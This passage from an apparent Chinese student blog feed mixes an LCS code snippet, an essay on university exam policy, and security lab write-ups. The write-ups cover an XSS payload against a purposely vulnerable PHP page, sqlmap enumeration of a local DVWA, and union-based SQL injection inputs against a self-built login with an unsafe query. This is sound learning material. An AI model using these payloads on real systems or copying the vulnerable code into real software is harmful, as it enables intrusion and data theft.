class="built_in">cin</span>&gt;&gt;a&gt;&gt;b;</span><br><span class="line">    <span class="keyword">int</span> n,m,max=<span class="number">0</span>;</span><br><span class="line">    n=a.size();</span><br><span class="line">    m=b.size();</span><br><span class="line">    <span class="keyword">int</span> lcm[n+<span class="number">1</span>][m+<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= n; ++i)</span><br><span class="line">        lcm[i][<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= m; ++i)</span><br><span class="line">        lcm[<span class="number">0</span>][i] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=m;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(a[i<span class="number">-1</span>]==b[j<span class="number">-1</span>])</span><br><span class="line">            &#123;</span><br><span class="line">                lcm[i][j]=lcm[i<span class="number">-1</span>][j<span class="number">-1</span>]+<span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                lcm[i][j]=maxx(lcm[i][j<span class="number">-1</span>],lcm[i<span class="number">-1</span>][j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;lcm[n][m];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS攻击简单示例</title>
      <link href="/2019/10/13/XSS%E6%94%BB%E5%87%BB%E7%AE%80%E5%8D%95%E7%A4%BA%E4%BE%8B/"/>
      <url>/2019/10/13/XSS%E6%94%BB%E5%87%BB%E7%AE%80%E5%8D%95%E7%A4%BA%E4%BE%8B/</url>
      
        <content type="html"><![CDATA[<p>xss</p><a id="more"></a><h3 id="建立漏洞页面"><a href="#建立漏洞页面" class="headerlink" title="建立漏洞页面"></a>建立漏洞页面</h3><p>在www目录下新建xss.php,代码如下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html;charset=utf-8"</span>&gt;</span><br><span class="line">&lt;title&gt;xss漏洞简单搭建&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">&lt;h6&gt;把我们输入的字符串输出到input里的value属性里&lt;/h6&gt;</span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"get"</span>&gt;</span><br><span class="line">&lt;h6&gt;请输入你想显现的字符串&lt;/h6&gt;</span><br><span class="line">&lt;input type=<span class="string">"text"</span> name=<span class="string">"xss_input_value"</span> value=<span class="string">"输入"</span>&gt;&lt;br /&gt;</span><br><span class="line">&lt;input type=<span class="string">'submit'</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//php防注入和XSS攻击通用过滤</span></span><br><span class="line"><span class="comment">//$_GET     &amp;&amp; SafeFilter($_GET);</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SafeFilter</span> <span class="params">(&amp;$arr)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   $ra=<span class="keyword">Array</span>(<span class="string">'/([\x00-\x08,\x0b-\x0c,\x0e-\x19])/'</span>,<span class="string">'/script/'</span>,<span class="string">'/javascript/'</span>,<span class="string">'/vbscript/'</span>,<span class="string">'/expression/'</span>,<span class="string">'/applet/'</span></span><br><span class="line">   ,<span class="string">'/meta/'</span>,<span class="string">'/xml/'</span>,<span class="string">'/blink/'</span>,<span class="string">'/link/'</span>,<span class="string">'/style/'</span>,<span class="string">'/embed/'</span>,<span class="string">'/object/'</span>,<span class="string">'/frame/'</span>,<span class="string">'/layer/'</span>,<span class="string">'/title/'</span>,<span class="string">'/bgsound/'</span></span><br><span class="line">   ,<span class="string">'/base/'</span>,<span class="string">'/onload/'</span>,<span class="string">'/onunload/'</span>,<span class="string">'/onchange/'</span>,<span class="string">'/onsubmit/'</span>,<span class="string">'/onreset/'</span>,<span class="string">'/onselect/'</span>,<span class="string">'/onblur/'</span>,<span class="string">'/onfocus/'</span>,</span><br><span class="line">   <span class="string">'/onabort/'</span>,<span class="string">'/onkeydown/'</span>,<span class="string">'/onkeypress/'</span>,<span class="string">'/onkeyup/'</span>,<span class="string">'/onclick/'</span>,<span class="string">'/ondblclick/'</span>,<span class="string">'/onmousedown/'</span>,<span class="string">'/onmousemove/'</span></span><br><span class="line">   ,<span class="string">'/onmouseout/'</span>,<span class="string">'/onmouseover/'</span>,<span class="string">'/onmouseup/'</span>,<span class="string">'/onunload/'</span>);</span><br><span class="line">     </span><br><span class="line">   <span class="keyword">if</span> (is_array($arr))</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $key =&gt; $value) </span><br><span class="line">     &#123;</span><br><span class="line">        <span class="keyword">if</span> (!is_array($value))</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (!get_magic_quotes_gpc())  <span class="comment">//不对magic_quotes_gpc转义过的字符使用addslashes(),避免双重转义。</span></span><br><span class="line">          &#123;</span><br><span class="line">             $value  = addslashes($value); <span class="comment">//给单引号（'）、双引号（"）、反斜线（\）与 NUL（NULL 字符）  加上反斜线转义</span></span><br><span class="line">          &#125;</span><br><span class="line">          $value       = preg_replace($ra,<span class="string">''</span>,$value);     <span class="comment">//删除非打印字符，粗暴式过滤xss可疑字符串</span></span><br><span class="line">          $arr[$key]     = htmlentities(strip_tags($value)); <span class="comment">//去除 HTML 和 PHP 标记并转换为 HTML 实体</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          SafeFilter($arr[$key]);</span><br><span class="line">        &#125;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'xss_input_value'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$s=$_GET[<span class="string">'xss_input_value'</span>];</span><br><span class="line"><span class="keyword">echo</span><span class="string">'&lt;input type="text" value="'</span>.$_GET[<span class="string">'xss_input_value'</span>].<span class="string">'"&gt;'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;input type="text" value="输出"&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/center&gt;</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>在浏览器输入<a href="http://localhost/xss.php/" target="_blank" rel="noopener">http://localhost/xss.php/</a></p><p>进入页面</p><p><img src="C:%5CUsers%5C%E5%BC%A0%E5%AF%85%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1570973405972.png" alt="1570973405972"></p><p>输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&gt;&lt;img src=1 onerror=alert(/xss/)&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/10/13/UonfqPdrGlsBXSt.png" alt="L0_P317WRNGPCYPGDQPG_0O.png"></p><p>攻击成功</p><h3 id="漏洞修补"><a href="#漏洞修补" class="headerlink" title="漏洞修补"></a>漏洞修补</h3><p>将xss.php中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//<span class="variable">$_GET</span>     &amp;&amp; SafeFilter(<span class="variable">$_GET</span>);</span><br></pre></td></tr></table></figure><p>注释去掉</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span>     &amp;&amp; SafeFilter(<span class="variable">$_GET</span>);</span><br></pre></td></tr></table></figure><p>通过SafeFilter()函数来过滤输入的内容</p><p>再输入刚才的内容</p><p><img src="https://i.loli.net/2019/10/13/l2DCHsWTqGRXNfJ.png" alt="_I9UOP3AI0448_OMY9_R_6Y.png"></p><p><strong>注意：建议用ie浏览器打开，关闭ie浏览器的xss过滤器</strong></p>]]></content>
      
      
      <categories>
          
          <category> XSS攻击 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>教育部取消毕业前补考的意见(某人的毛概作业)</title>
      <link href="/2019/10/13/%E6%95%99%E8%82%B2%E9%83%A8%E5%8F%96%E6%B6%88%E6%AF%95%E4%B8%9A%E5%89%8D%E8%A1%A5%E8%80%83%E7%9A%84%E6%84%8F%E8%A7%81/"/>
      <url>/2019/10/13/%E6%95%99%E8%82%B2%E9%83%A8%E5%8F%96%E6%B6%88%E6%AF%95%E4%B8%9A%E5%89%8D%E8%A1%A5%E8%80%83%E7%9A%84%E6%84%8F%E8%A7%81/</url>
      
        <content type="html"><![CDATA[<p>据教育部10月12日消息，近日，教育部印发了《关于深化本科教育教学改革 全面提高人才培养质量的意见》（以下简称《意见》）。</p><p>《意见》要求，要严把考试和毕业出口关。加强考试管理，严肃考试纪律，坚决取消毕业前补考等“清考”行为。加强学生体育课程考核，不能达到《国家学生体质健康标准》合格要求者不能毕业。科学合理制定本科毕业设计（论文）要求，严格全过程管理，严肃处理各类学术不端行为。落实学士学位管理办法，健全学士学位管理制度，严格学士学位标准和授权管理，严把学位授予关。</p><a id="more"></a><p>先从个人观点来说，这件事对自己来说是没有影响的，因为我觉得在大学里成绩门门都上90是不容易的，但是只要按时上课，不经常逃课，上课认真听听，不是一直在玩手机，考试前在突击复习一下，不能保证90+，但是及格还是没有什么大问题的，反而原来有毕业大补考，助长了那些不去上课，懒在宿舍睡觉的人。</p><p>从学校，老师的层面来看，这是不太公平的，因为每个学校的教学质量，学术要求都是不一样的，课程难度也是不一样的，必修课通过率可能会很高，专业课甚至挂科率能到达恐怖的50%，而且还有平时分这么玄妙的东西，如果老师的平时分严格按照学生平时表现给（当然不可能），这个《意见》绝对是公平的，而且是必要的。但是大学的分数又很玄妙，老师一般不按学生表现给平时分（因为学生实在太多），一般会用平时作业来代替，这就给了某些人有机可趁，经常去老师那问问题，让老师记住你，老师就可能会给很高的平时分（经常），因为本来老师就不认识几个人。其实这个现象还算好的，因为你至少学了，还获得好处，一下情况是最让人恶心的，亲身经历。</p><p>某一《课程》，老师讲的实在太“高深”，我实在听不懂，就跑去了其它班听课，他平时也不点名，他布置的平时作业也认真写了，最后卷面我考了90+，平时分给了70+，原来是他布置网络作业的时候要求没说明白，导致网上导出的成绩很低，这明明是老师的原因，本来这门课可以满绩点，甚至保研的时候多点希望，就这样被老师的不负责给抹掉了。</p><p>所以如果每个大学，每个老师，每门课程的成绩认定对每位同学都是公平的话，这篇《意见》我希望马上在每所大学实施，但现阶段对一部分人来说可能是不公平的，相反，大学可能会为了通过率，而减小考核难度，成绩作假等等，而这些我相信并不是《意见》所希望看到的。</p><p>再从国家层面来看，教育部就是想做两件事–严格人才分层，高校考核综合化合理化。“严进宽出”的时代要结束。</p><p>中国高校肯定算不上“严出”，如今从教育部到各高校都开始重视起来，当然是件好事。</p><p>但是，“严出”应该从课程标准上严格，比如教师的PPT不能七八年都用同一套，一些混学分的“水”课该消失就得消失。</p><p>另外，国内高校善用“数字指标”管理，很可能强行设置淘汰率，毕竟国内曾有名校每门课控制10%学生不及格的规定。</p><p>这是一把“双刃剑”，应谨慎掌握，这意味着大家都努力，也有人会被淘汰。这样绝对化的评价显然有失公平，其负面效应可能影响正面初衷。</p><p>千万不能只从毕业率上严格，硬性规定学校要有多少淘汰率，那只是“换汤不换药”。</p><p>从世界范围内看，大学本不该是这般“好混”。</p><p>从教育规律本身、高等教育所要体现的含金量来说，大学学习无疑需要学生付出相当精力。</p><p>但为什么之前很多高校都对学生“心慈手软”了呢？</p><p>因为在现在的高考体制下，中国学生读大学的机会成本太高。学生一旦被退学，就相当于一无所有，只能返回原籍，想再读大学，就要重新参加高考。</p><p>所以，大学在把严出口关的同时，对于学习跟不上的学生，应该有制度配套，以免让他们失去接受教育的机会。</p><p>总体来看《意见》的出发点是好的，但是目前中国的教育还存在一些矛盾，要想达到《意见》的初衷还需要一段时间去解决，我还是很看好教育部的“严出”措施，因为目前来说本科生已经十分不值钱了。</p>]]></content>
      
      
      <categories>
          
          <category> 新闻点评 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 新闻 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用sqlmap注入dvwa</title>
      <link href="/2019/10/13/%E5%88%A9%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5dvwa/"/>
      <url>/2019/10/13/%E5%88%A9%E7%94%A8sqlmap%E6%B3%A8%E5%85%A5dvwa/</url>
      
        <content type="html"><![CDATA[<p>利用sqlmap对dvwa进行注入。</p><a id="more"></a><p>kali自带sqlmap，在主机安装DVWA</p><p>DVWA的安装：</p><p><a href="http://www.dvwa.co.uk/" target="_blank" rel="noopener">http://www.dvwa.co.uk/</a></p><p>进入网址，下载zip，解压到www目录下，修改www/DVWA/config/config.inc.php中的数据库密码</p><p>浏览器进入localhost/DVWA/输入默认用户名admin,密码password，然后点击页面上的“create/reset database”就可以完成了，将DVWA security改成非impossible</p><p><img src="https://i.loli.net/2019/10/13/Yr1mnjIOKhF3fJD.png" alt="LBPT_7ZN9O_Z6Z_9_9_GJCN.png"></p><p>在kali上上启动sqlmap，由于我是虚拟机上运行的sqlmap，只需要将localhost换成主机IP即可</p><p>开始注入url:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.74.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie=<span class="string">"security=low;PHPSESSID=objgo9hbf567bvqkmf45ffmts0"</span></span><br></pre></td></tr></table></figure><p>由于这个注入页面需要登陆，所以还得加上cookie(chrome下cookie导出工具editthiscookie),过程中会不断让输入Y/N，可以加上参数–batch，来自动填写默认值。</p><p><img src="https://i.loli.net/2019/10/13/6X3MUkLP5Nftz2e.png" alt="_GCJPZ3_5T3T97_6K37__QN.png"></p><p>得到数据库类型版本信息(mysql)，服务器类型版本信息(apache，php)</p><p>用–dbs查看数据库名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.74.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie=<span class="string">"security=low;PHPSESSID=objgo9hbf567bvqkmf45ffmts0"</span> --batch --dbs</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/10/13/JoAiTGRt9q4FNeL.png" alt="7QU2_IR5VYECTF~_V~QPQ_6.png"></p><p>得到6个数据库名</p><p>用–D xxx查看指定数据库，–tables查看数据库中表信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.74.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie=<span class="string">"security=low;PHPSESSID=objgo9hbf567bvqkmf45ffmts0"</span> --batch -D dvwa --tables</span><br></pre></td></tr></table></figure><p>![__O`CQDEB_3S_A_WIYRY089.png](<a href="https://i.loli.net/2019/10/13/3sNWgyEmRpejlhI.png" target="_blank" rel="noopener">https://i.loli.net/2019/10/13/3sNWgyEmRpejlhI.png</a>)</p><p>得到了数据库dvwa的所有表名</p><p>用–T xxx查看指定表，–columns查看表的列信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"http://192.168.74.1/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie=<span class="string">"security=low;PHPSESSID=objgo9hbf567bvqkmf45ffmts0"</span> --batch -D dvwa -T users --columns</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/10/13/3xNvIqEUPbjOCJM.png" alt="_K_TD7~IC_AW_D_~656GBNQ.png"></p><p>得到了数据库dvwa中表users的数据信息</p><p>注入成功！</p>]]></content>
      
      
      <categories>
          
          <category> sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简单sql注入环境搭建及注入</title>
      <link href="/2019/10/12/%E7%AE%80%E5%8D%95sql%E6%B3%A8%E5%85%A5%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E6%B3%A8%E5%85%A5/"/>
      <url>/2019/10/12/%E7%AE%80%E5%8D%95sql%E6%B3%A8%E5%85%A5%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>网络安全作业二，sql注入，搭建注入环境并注入，以及修补注入漏洞。（图片显示不了的话，点开链接就能看了）</p><a id="more"></a><h2 id="一、服务器搭建"><a href="#一、服务器搭建" class="headerlink" title="一、服务器搭建"></a>一、服务器搭建</h2><h3 id="1、安装wampserver"><a href="#1、安装wampserver" class="headerlink" title="1、安装wampserver"></a>1、安装wampserver</h3><p>wampserver在windows下将Apache+PHP+Mysql 集成,一键操作，比较方便，在此选用是因为重点在sql注入上，而不是服务器的搭建，如果想透彻学习服务器搭建，建议不要使用集成环境，可以自己一个一个装，修改配置，最后将这些连到到一起，一个网站就搭好了。</p><h3 id="2、安装后的可能会遇到的问题"><a href="#2、安装后的可能会遇到的问题" class="headerlink" title="2、安装后的可能会遇到的问题"></a>2、安装后的可能会遇到的问题</h3><p>安装完成后，打开，电脑右下角wampserver的图标应该是绿色的，如果是红色和橙色，那就是有些服务没有开启，在图标上左键查看是哪个服务没有开启。</p><p>![3~_25K4IG`WGJ646US7GU4B.png](<a href="https://i.loli.net/2019/10/12/nexdYS84XCuc2hv.png" target="_blank" rel="noopener">https://i.loli.net/2019/10/12/nexdYS84XCuc2hv.png</a>)</p><p>花花在安装的时候就是橙色的，原因是之前做的计网实验开启了IIS服务，与apache服务冲突了，所以关掉IIS服务就可以了，具体方法为：计算机——有键——管理——服务，找到IIS关闭即可。如果之前的数据库实验用的不是MySQL，而是SQL sever，则需要将SQL server服务也关闭，方法同上。</p><h3 id="3、编写登录页和测试页"><a href="#3、编写登录页和测试页" class="headerlink" title="3、编写登录页和测试页"></a>3、编写登录页和测试页</h3><p>左键wampserver的小图标，打开www目录，进入，新建两个文件，login.php,test.php。编辑两个文件，代码如下：</p><p>login.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;网络安全作业二&lt;/title&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"content-type"</span> content=<span class="string">"text/html;charset=utf-8"</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"> &lt;body &gt;</span><br><span class="line">&lt;form action=<span class="string">"test.php"</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">  &lt;fieldset &gt;</span><br><span class="line">    &lt;legend&gt;自建sql注入平台&lt;/legend&gt;</span><br><span class="line">    &lt;table&gt;</span><br><span class="line">      &lt;tr&gt;</span><br><span class="line">        &lt;td&gt;用户名：&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;&lt;input type=<span class="string">"text"</span> name=<span class="string">"username"</span>&gt;&lt;/td&gt;</span><br><span class="line">      &lt;/tr&gt;</span><br><span class="line">      &lt;tr&gt;</span><br><span class="line">        &lt;td&gt;密  码：&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;&lt;input type=<span class="string">"text"</span> name=<span class="string">"password"</span>&gt;&lt;/td&gt;</span><br><span class="line">      &lt;/tr&gt;</span><br><span class="line">      &lt;tr&gt;</span><br><span class="line">        &lt;td&gt;&lt;input type=<span class="string">"submit"</span> value=<span class="string">"提交"</span>&gt;&lt;/td&gt;</span><br><span class="line">        &lt;td&gt;&lt;input type=<span class="string">"reset"</span> value=<span class="string">"重置"</span>&gt;&lt;/td&gt;</span><br><span class="line">      &lt;/tr&gt;</span><br><span class="line">    &lt;/table&gt;</span><br><span class="line">  &lt;/fieldset&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>test.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pwd=$_POST[<span class="string">'password'</span>];</span><br><span class="line">$uname=$_POST[<span class="string">'username'</span>];</span><br><span class="line"><span class="comment">//echo "您当前执行的sql语句为：" ;</span></span><br><span class="line"><span class="comment">//echo "select * from admin where passward='$pwd' and name='$uname'&lt;br/&gt;";</span></span><br><span class="line"><span class="comment">//echo "&lt;hr&gt;";</span></span><br><span class="line">$mysqli = <span class="keyword">new</span> mysqli(<span class="string">'127.0.0.1'</span>,<span class="string">'root'</span>,<span class="string">''</span>,<span class="string">'sqlin'</span>); </span><br><span class="line"><span class="keyword">if</span>(mysqli_connect_errno())&#123;</span><br><span class="line">    printf(<span class="string">"连接失败:%s&lt;br&gt;"</span>,mysqli_connect_error());</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$result = $mysqli-&gt;query(<span class="string">"select * from admin where name='$uname'"</span>);</span><br><span class="line"><span class="comment">//print_r($result-&gt;fetch_array(MYSQLI_ASSOC));</span></span><br><span class="line"><span class="keyword">if</span>($row=mysqli_fetch_row($result))</span><br><span class="line">&#123;</span><br><span class="line">printf (<span class="string">"%s : %s"</span>,$row[<span class="number">0</span>],$row[<span class="number">1</span>]);</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"success！"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"账号或密码错误！"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$mysqli-&gt;close();</span><br><span class="line">$result-&gt;close();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后在浏览器上输入<a href="http://localhost/login.php，即可进入登陆页面。" target="_blank" rel="noopener">http://localhost/login.php，即可进入登陆页面。</a></p><p>不过目前还没有数据库信息，在wampserver小图标左键打开mysql,进入，默认无密码，建立名为sqlin的数据库，和名为admin的表，由于以前做过数据库实验，命令在此不在赘述。</p><p>![_Z47<del>NFQ_K3X`XS_D</del>DT9~9.png](<a href="https://i.loli.net/2019/10/12/cC5yGfQdmr3JabB.png" target="_blank" rel="noopener">https://i.loli.net/2019/10/12/cC5yGfQdmr3JabB.png</a>)</p><p><img src="https://i.loli.net/2019/10/12/jINGSXkoeb6iME2.png" alt="6__2BL4Q_2N89_7SVVLTMF3.png"></p><p>这样环境就搭好了，可以开始注入了。</p><h2 id="二、简单的sql注入"><a href="#二、简单的sql注入" class="headerlink" title="二、简单的sql注入"></a>二、简单的sql注入</h2><h3 id="判断有几个显示位。"><a href="#判断有几个显示位。" class="headerlink" title="判断有几个显示位。"></a>判断有几个显示位。</h3><p>输入如下:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户名：1<span class="string">' union select 1,2,3#</span></span><br><span class="line"><span class="string">密码：111（任意）</span></span><br></pre></td></tr></table></figure><p>发现报错，显示位不是3，重试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户名：1<span class="string">' union select 1,2#</span></span><br><span class="line"><span class="string">密码：111（任意）</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/10/12/Sas25K4ApngoYRV.png" alt="_AHNB_05K_I_RL5_6_9LCH7.png"></p><p>显示位为两位</p><h3 id="确定表有几列"><a href="#确定表有几列" class="headerlink" title="确定表有几列"></a>确定表有几列</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户名：1<span class="string">' order by 3#</span></span><br><span class="line"><span class="string">密码：111（任意）</span></span><br></pre></td></tr></table></figure><p>报错，不是3列</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户名：1<span class="string">' order by 2#</span></span><br><span class="line"><span class="string">密码：111（任意）</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/10/12/bSEAV4kptPBscaw.png" alt="G_I__P__36X9D_O_YK_OMO9.png"></p><p>表有2列</p><h3 id="获取数据库名"><a href="#获取数据库名" class="headerlink" title="获取数据库名"></a>获取数据库名</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户名：1<span class="string">' union select 1,database() #</span></span><br><span class="line"><span class="string">密码：111（任意）</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/10/12/NMXYBixLmqFGac1.png" alt="0FV6JIXIMQJY_WPE0~I__7T.png"></p><p>数据库名为sqlin</p><h3 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户名：1<span class="string">' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #</span></span><br><span class="line"><span class="string">密码：111（任意）</span></span><br></pre></td></tr></table></figure><p>![X_7_7ZT1P~YPSMBJY`@_026.png](<a 